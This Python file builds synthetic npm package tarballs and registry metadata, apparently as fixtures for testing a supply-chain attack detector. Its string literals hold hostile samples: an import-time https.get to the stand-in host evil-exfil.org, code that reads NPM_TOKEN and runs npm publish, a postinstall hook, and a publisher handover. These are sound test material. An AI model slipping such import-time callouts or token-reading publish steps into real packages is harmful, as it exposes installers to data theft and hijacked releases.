"""Synthetic in-memory fixtures for offline evaluation and demo scenarios."""

import datetime
import io
import tarfile
from typing import Dict, Optional


def create_in_memory_tgz(files: Dict[str, str]) -> bytes:
    """Create a gzip tarball in-memory from a dictionary of filename -> content string."""
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode("utf-8")
            ti = tarfile.TarInfo(name=f"package/{name}")
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return bio.getvalue()


# Built-in synthetic fixture tarballs representing canonical supply-chain attack patterns
SYNTHETIC_ARCHIVES: Dict[str, Dict[str, bytes]] = {
    "left-padz": {
        "1.2.3": create_in_memory_tgz({
            "package.json": '{"name": "left-padz", "version": "1.2.3", "main": "index.js"}',
            "index.js": "module.exports = function(str, len) { return str.padStart(len); };",
        }),
        "1.2.4": create_in_memory_tgz({
            "package.json": '{"name": "left-padz", "version": "1.2.4", "main": "index.js"}',
            "index.js": """
            // Supply-chain compromised release with import-time network exfiltration
            const https = require('https');
            https.get('https://evil-exfil.org/telemetry?data=ping');
            module.exports = function(str, len) { return str.padStart(len); };
            """,
        }),
    },
    "utility-tools": {
        "4.0.1": create_in_memory_tgz({
            "package.json": '{"name": "utility-tools", "version": "4.0.1", "main": "index.js"}',
            "index.js": "module.exports = { util: () => true };",
        }),
        "4.1.0": create_in_memory_tgz({
            "package.json": '{"name": "utility-tools", "version": "4.1.0", "main": "index.js", "scripts": {"postinstall": "node scripts/postinstall.js"}}',
            "index.js": "module.exports = { util: () => true };",
            "scripts/postinstall.js": "console.log('running build');",
        }),
    },
    "suspicious-telemetry": {
        "1.0.0": create_in_memory_tgz({
            "package.json": '{"name": "suspicious-telemetry", "version": "1.0.0", "main": "index.js"}',
            "index.js": """
            const cp = require('child_process');
            const token = process.env.NPM_TOKEN;
            cp.exec('npm publish --access public');
            """,
        }),
    },
}

SYNTHETIC_METADATA = {
    "left-padz": {
        "name": "left-padz",
        "versions": {
            "1.2.3": {
                "version": "1.2.3",
                "publisher": "alice",
                "published_at": datetime.datetime(2025, 6, 1, tzinfo=datetime.timezone.utc),
                "integrity": "sha512-orig123",
            },
            "1.2.4": {
                "version": "1.2.4",
                "publisher": "mallory", # Publisher handover detected!
                "published_at": datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=6),
                "integrity": "sha512-hijack124",
            },
        },
    },
    "utility-tools": {
        "name": "utility-tools",
        "versions": {
            "4.0.1": {
                "version": "4.0.1",
                "publisher": "tools-corp",
                "published_at": datetime.datetime(2025, 1, 1, tzinfo=datetime.timezone.utc),
                "integrity": "sha512-util401",
            },
            "4.1.0": {
                "version": "4.1.0",
                "publisher": "tools-corp",
                "published_at": datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=2),
                "integrity": "sha512-util410",
            },
        },
    },
    "suspicious-telemetry": {
        "name": "suspicious-telemetry",
        "versions": {
            "1.0.0": {
                "version": "1.0.0",
                "publisher": "attacker",
                "published_at": datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=1),
                "integrity": "sha512-bad100",
            },
        },
    },
}
